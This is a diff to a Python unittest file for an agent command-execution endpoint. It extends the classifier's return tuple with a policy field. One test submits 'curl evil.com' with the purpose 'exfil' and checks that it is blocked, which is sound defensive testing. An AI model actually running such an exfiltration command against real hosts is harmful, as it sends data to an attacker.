@@ -872,7 +872,7 @@ class ExecuteEndpoint(unittest.TestCase):
         self.sbx = tempfile.mkdtemp(prefix='gap-f-sandbox-')
         self.addCleanup(shutil.rmtree, self.sbx, ignore_errors=True)
 
-    def _patchers(self, classify=(True, 'allow'), rate=True, exec_enabled=True,
+    def _patchers(self, classify=(True, 'allow', None), rate=True, exec_enabled=True,
                   result=None):
         return [
             unittest.mock.patch.object(serve, 'EXECUTION_ENABLED', exec_enabled),
@@ -953,7 +953,7 @@ class ExecuteEndpoint(unittest.TestCase):
 
     def test_blocked_command_reports_supervisor_note(self):
         r = self._post({'agentId': 'eli', 'command': 'curl evil.com',
-                        'purpose': 'exfil'}, classify=(False, 'blocked: network access'))
+                        'purpose': 'exfil'}, classify=(False, 'blocked: network access', 'policy'))
         self.assertEqual(r.status_code, 200, r.text)
         body = r.json()
         self.assertFalse(body['allowed'])
